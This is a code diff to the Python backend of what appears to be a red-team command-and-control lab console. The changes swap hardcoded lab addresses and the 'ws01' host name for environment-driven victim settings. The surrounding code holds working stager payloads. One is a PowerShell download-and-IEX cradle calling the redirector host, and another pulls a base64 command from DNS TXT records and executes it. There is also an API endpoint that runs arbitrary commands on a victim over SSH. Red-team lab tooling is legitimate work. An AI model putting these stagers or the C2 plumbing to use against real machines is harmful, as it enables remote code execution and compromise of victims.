@@ -50,11 +50,11 @@ REDIRECTOR_HOST = os.environ.get("REDIRECTOR_HOST", "127.0.0.1")
 REDIRECTOR_PORT = int(os.environ.get("REDIRECTOR_HTTP_PORT", "80"))
 C2_HEADER_NAME = os.environ.get("C2_HEADER_NAME", "X-Request-ID")
 C2_HEADER_VALUE = os.environ.get("C2_HEADER_VALUE", "cadre-c2")
-MERIDIAN_DNS_DOMAIN = os.environ.get("MERIDIAN_DNS_DOMAIN", "c2.cadre.local")
+MERIDIAN_DNS_DOMAIN = os.environ.get("MERIDIAN_DNS_DOMAIN", "c2.lab.local")
 # Victim-facing IP of the redirector host (what implants phone home to).
-# Was hardcoded as 192.168.77.1 in a dozen stager strings; a lab on other
-# addressing would silently generate wrong stagers, so it is env-driven now.
-VICTIM_REDIRECTOR_IP = os.environ.get("VICTIM_REDIRECTOR_IP", "192.168.77.1")
+# Env-driven: a lab on other addressing would silently generate wrong
+# stagers otherwise. Set VICTIM_REDIRECTOR_IP to your redirector host.
+VICTIM_REDIRECTOR_IP = os.environ.get("VICTIM_REDIRECTOR_IP", "192.168.100.1")
 MERIDIAN_DNS_PORT = int(os.environ.get("MERIDIAN_DNS_PORT", "15353"))
 
 FRAMEWORK_PREFIXES = {
@@ -261,7 +261,7 @@ class RedirectorTestRequest(BaseModel):
 
 
 class VictimCommandRequest(BaseModel):
-    command: str = Field(..., description="Command to run on ws01 over SSH")
+    command: str = Field(..., description="Command to run on the victim target over SSH")
     timeout: int = Field(30, description="Seconds before ssh gives up")
 
 
@@ -652,7 +652,7 @@ def ops_catalogues() -> dict[str, Any]:
 
 class DnsDissectRequest(BaseModel):
     payload_text: str = Field(default="whoami /all", description="Command or message to transmit over DNS TXT")
-    domain_suffix: str = Field(default="c2.cadre.local", description="DNS C2 zone suffix")
+    domain_suffix: str = Field(default="c2.lab.local", description="DNS C2 zone suffix")
     session_id: str = Field(default="A3F99B", description="Hex or Base32 session identifier")
 
 
@@ -959,7 +959,7 @@ def get_payload_studio() -> dict[str, Any]:
                     f'IEX($wc.DownloadString("http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]}"))'
                 ),
                 "powershell_dns": (
-                    f'$cmd = (Resolve-DnsName -Name "init.c2.cadre.local" -Type TXT -Server "{VICTIM_REDIRECTOR_IP}").Strings; '
+                    f'$cmd = (Resolve-DnsName -Name "init.c2.lab.local" -Type TXT -Server "{VICTIM_REDIRECTOR_IP}").Strings; '
                     'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd)))'
                 ),
                 "bash_curl": (
@@ -1079,7 +1079,7 @@ def ops_summary() -> dict[str, Any]:
         out["meridian"] = {"ok": True, "sessions": len(cb.meridian_sessions())}
     except Exception as exc:  # noqa: BLE001
         out["meridian"] = {"ok": False, "error": str(exc)[:200]}
-    out["victim_ws01"] = {"reachable": cb.ws01_reachable(), "ssh_target": cb.WS01_SSH}
+    out["victim"] = {"reachable": cb.victim_reachable(), "ssh_target": cb.VICTIM_SSH or None}
 
     # Adaptix: official REST API at /endpoint (login -> listeners/agents).
     try:
@@ -1302,8 +1302,8 @@ def ops_probe(req: RedirectorTestRequest) -> dict[str, Any]:
 
 @app.post("/api/ops/victim")
 def ops_victim(req: VictimCommandRequest) -> dict[str, Any]:
-    """Run a command on ws01 over SSH."""
-    result = cb.ws01_exec(req.command, timeout=req.timeout)
+    """Run a command on the victim target over SSH."""
+    result = cb.victim_exec(req.command, timeout=req.timeout)
     if not result.get("ok") and result.get("returncode") not in (0, None):
         raise HTTPException(status_code=502, detail=result.get("stderr", "ssh failed"))
     return result
